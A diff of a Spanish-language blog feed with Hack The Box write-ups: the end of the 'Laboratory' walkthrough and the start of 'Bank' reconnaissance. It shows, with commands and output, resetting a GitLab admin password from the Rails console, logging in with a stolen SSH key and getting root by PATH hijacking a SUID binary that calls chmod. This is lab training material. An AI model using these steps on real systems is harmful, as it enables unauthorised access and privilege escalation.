+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git@git:~/gitlab-rails/working&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hostname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;hostname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt;
+172.17.0.2 
+git@git:~/gitlab-rails/working&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Haremos un &lt;a href=&quot;/tratamiento-tty&quot;&gt;Tratamiento de la tty&lt;/a&gt; para trabajar más cómodos y luego a encontrar una forma de salir del contenedor.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git@git:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gitlab-rails console
+&lt;span class=&quot;nt&quot;&gt;--------------------------------------------------------------------------------&lt;/span&gt;
+ GitLab:       12.8.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;d18b43a5f5a&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; FOSS
+ GitLab Shell: 11.0.0
+ PostgreSQL:   10.12
+&lt;span class=&quot;nt&quot;&gt;--------------------------------------------------------------------------------&lt;/span&gt;
+Loading production environment &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Rails 6.0.2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+irb&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;main&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:001:0&amp;gt;        
+&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; nil
+irb&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;main&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:003:0&amp;gt; User.active
+&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#&amp;lt;ActiveRecord::Relation [#&amp;lt;User id:4 @seven&amp;gt;, #&amp;lt;User id:1 @dexter&amp;gt;, #&amp;lt;User id:5 @k4miyo&amp;gt;]&amp;gt;&lt;/span&gt;
+irb&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;main&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:004:0&amp;gt; User.admins
+&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#&amp;lt;ActiveRecord::Relation [#&amp;lt;User id:1 @dexter&amp;gt;]&amp;gt;&lt;/span&gt;
+irb&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;main&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:005:0&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Desde la consola de Gitlab podemos ver a los usuarios activos y los administradores; para este caso, &lt;strong&gt;dexter&lt;/strong&gt; es el único usuario administrador; por lo tanto, vamos a ver si podemos cambiar su contraseña.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;irb&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;main&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:008:0&amp;gt; u &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; User.find&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#&amp;lt;User id:1 @dexter&amp;gt;&lt;/span&gt;
+irb&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;main&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:009:0&amp;gt; u.password &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'hola123hola'&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;hola123hola&quot;&lt;/span&gt;
+irb&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;main&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:010:0&amp;gt; u.password_confirmation &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'hola123hola'&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;hola123hola&quot;&lt;/span&gt;
+irb&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;main&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:011:0&amp;gt; u.save
+Enqueued ActionMailer::DeliveryJob &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Job ID: e7825ba1-d43a-4dd9-ab3b-a62e4cc6f107&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; to Sidekiq&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;mailers&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; with arguments: &lt;span class=&quot;s2&quot;&gt;&quot;DeviseMailer&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;password_change&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;deliver_now&quot;&lt;/span&gt;, &lt;span class=&quot;c&quot;&gt;#&amp;lt;GlobalID:0x00007f0a94aed0f8 @uri=#&amp;lt;URI::GID gid://gitlab/User/1&amp;gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true
+&lt;/span&gt;irb&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;main&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:012:0&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Cambiamos la contraseña del usuario administrador &lt;strong&gt;dexter&lt;/strong&gt; por &lt;strong&gt;hola123hola&lt;/strong&gt;; vamos a ver si podemos ingresar al Gitlab:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-laboratory/laboratory-web3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ya ingresamos a los recursos del usuario &lt;strong&gt;dexter&lt;/strong&gt;. Buscando un poco en los repositorios, nos encontramos con una &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt;, por lo tanto la descargamos, le asignamos el privilegio 600 y tratamos de conectarnos a la máquina por SSH:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ vi id_rsa
+❯ &lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;600 id_rsa
+❯ ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; id_rsa dexter@10.10.10.216
+The authenticity of host &lt;span class=&quot;s1&quot;&gt;'10.10.10.216 (10.10.10.216)'&lt;/span&gt; can&lt;span class=&quot;s1&quot;&gt;'t be established.
+ECDSA key fingerprint is SHA256:XexmI3GbFIB7qyVRFDIYvKcLfMA9pcV9LeIgJO5KQaA.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '&lt;/span&gt;10.10.10.216&lt;span class=&quot;s1&quot;&gt;' (ECDSA) to the list of known hosts.
+dexter@laboratory:~$ whoami
+dexter
+dexter@laboratory:~$
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya estamos en la máquina víctima como el usuario &lt;strong&gt;dexter&lt;/strong&gt; y podemos visualizar la flag (user.txt). Ahora nos toca escalar privilegios, por lo tanto, vamos a enumerar un poco el sistema.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dexter@laboratory:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dexter&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dexter&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dexter&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+dexter@laboratory:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;dexter: 
+dexter@laboratory:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /
+dexter@laboratory:/&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+dexter@laboratory:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;perm &lt;span class=&quot;nt&quot;&gt;-4000&lt;/span&gt; 2&amp;gt;/dev/null | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; snap
+./usr/local/bin/docker-security
+./usr/bin/sudo
+./usr/bin/newgrp
+./usr/bin/su
+./usr/bin/gpasswd
+./usr/bin/fusermount
+./usr/bin/chfn
+./usr/bin/pkexec
+./usr/bin/at
+./usr/bin/umount
+./usr/bin/chsh
+./usr/bin/mount
+./usr/bin/passwd
+./usr/lib/eject/dmcrypt-get-device
+./usr/lib/dbus-1.0/dbus-daemon-launch-helper
+./usr/lib/policykit-1/polkit-agent-helper-1
+./usr/lib/openssh/ssh-keysign
+dexter@laboratory:/&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos permisos SUID en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pkexec&lt;/code&gt;; sin embargo, vamos a resolver la máquina como fue pensada. Tenemos el binario con permisos SUID &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/local/bin/docker-security&lt;/code&gt;, si lo ejecutamos no vemos nada; por lo tanto, vamos a ejecutarlo utilizando el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ltrace&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dexter@laboratory:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/local/bin/docker-security
+dexter@laboratory:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ltrace /usr/local/bin/docker-security
+setuid&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                      &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt;
+setgid&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                      &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt;
+system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;chmod 700 /usr/bin/docker&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt;: changing permissions of &lt;span class=&quot;s1&quot;&gt;'/usr/bin/docker'&lt;/span&gt;: Operation not permitted
+ &amp;lt;no &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; ...&amp;gt;
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; SIGCHLD &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Child exited&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+&amp;lt;... system resumed&amp;gt; &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                         &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 256
+system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;chmod 660 /var/run/docker.sock&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt;: changing permissions of &lt;span class=&quot;s1&quot;&gt;'/var/run/docker.sock'&lt;/span&gt;: Operation not permitted
+ &amp;lt;no &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; ...&amp;gt;
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; SIGCHLD &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Child exited&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+&amp;lt;... system resumed&amp;gt; &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                         &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 256
++++ exited &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;status 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; +++
+dexter@laboratory:/&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Aqui ya debemos ver algo interesante y es que el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod&lt;/code&gt; está siendo declarado de forma relativa y como absoluta; por lo tanto podemos hacer un &lt;strong&gt;Path Hijacking&lt;/strong&gt; creando un nuevo archivo bajo del directorio que queramos, siempre y cuando tengamos permisos; por ejemplo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/de/shm&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dexter@laboratory:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /dev/shm/
+dexter@laboratory:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;touch chmod
+&lt;/span&gt;dexter@laboratory:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vi &lt;span class=&quot;nb&quot;&gt;chmod
+&lt;/span&gt;dexter@laboratory:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat chmod
+&lt;/span&gt;bash &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
+dexter@laboratory:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x &lt;span class=&quot;nb&quot;&gt;chmod
+&lt;/span&gt;dexter@laboratory:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+total 4
+&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 dexter dexter 8 Mar 22 04:17 &lt;span class=&quot;nb&quot;&gt;chmod
+&lt;/span&gt;dexter@laboratory:/dev/shm&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora cambiamos el valor de la variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PATH&lt;/code&gt; para que se incluya primero la ruta de nuestro archivo:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dexter@laboratory:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/shm:&lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;
+dexter@laboratory:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;
+/dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin
+dexter@laboratory:/dev/shm&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Y ahora ejecutamos el binario del cual tenemos permisos SUID:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dexter@laboratory:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/local/bin/docker-security
+root@laboratory:/dev/shm# &lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;root
+root@laboratory:/dev/shm#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya somos el usuario &lt;strong&gt;root&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Bash" /><category term="Ruby" /><category term="Outdated_Software" /><category term="Patch_Management" /><summary type="html">Resolución de la máquina Laboratory en la plataforma de Hack The Box</summary></entry><entry><title type="html">Hack The Box Networked</title><link href="http://localhost:4000/htb-networked/" rel="alternate" type="text/html" title="Hack The Box Networked" /><published>2022-03-20T00:00:00-06:00</published><updated>2022-03-20T00:00:00-06:00</updated><id>http://localhost:4000/htb-networked</id><content type="html" xml:base="http://localhost:4000/htb-networked/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-networked/banner-networked.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;networked&quot;&gt;Networked&lt;/h2&gt;
 &lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.146.&lt;/p&gt;
@@ -4073,391 +4617,4 @@ bash-4.4# &lt;span class=&quot;nb&quot;&gt;whoami
 bash-4.4#
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Ya somos el usuario &lt;strong&gt;root&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Sandbox_Escape" /><summary type="html">Resolución de la máquina Cache en la plataforma de Hack The Box</summary></entry><entry><title type="html">Hack The Box Bank</title><link href="http://localhost:4000/htb-bank/" rel="alternate" type="text/html" title="Hack The Box Bank" /><published>2022-02-28T00:00:00-06:00</published><updated>2022-02-28T00:00:00-06:00</updated><id>http://localhost:4000/htb-bank</id><content type="html" xml:base="http://localhost:4000/htb-bank/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-bank/banner-bank.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;bank&quot;&gt;Bank&lt;/h2&gt;
-&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.29.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.29
-PING 10.10.10.29 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.29&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
-64 bytes from 10.10.10.29: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;132 ms
-
-&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.29 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
-1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
-rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 132.094/132.094/132.094/0.000 ms
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.10.10.29 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-02-28 12:03 CST
-Initiating Ping Scan at 12:03
-Scanning 10.10.10.29 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;4 ports]
-Completed Ping Scan at 12:03, 0.16s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Initiating SYN Stealth Scan at 12:03
-Scanning 10.10.10.29 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
-Discovered open port 22/tcp on 10.10.10.29
-Discovered open port 53/tcp on 10.10.10.29
-Discovered open port 80/tcp on 10.10.10.29
-Completed SYN Stealth Scan at 12:03, 35.63s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.29
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.13s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Not shown: 65532 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-PORT   STATE SERVICE
-22/tcp open  ssh
-53/tcp open  domain
-80/tcp open  http
-
-Read data files from: /usr/bin/../share/nmap
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;35.91 seconds
-           Raw packets sent: 67798 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.983MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 67772 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.711MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
-───────┬─────────────────────────────────────
-       │ File: extractPorts.tmp
-       │ Size: 119 B
-───────┼─────────────────────────────────────
-   1   │ 
-   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
-   3   │ 
-   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.29
-   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 22,53,80
-   6   │ 
-   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,53,80 10.10.10.29 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-02-28 12:04 CST
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.29
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-| ssh-hostkey: 
-|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
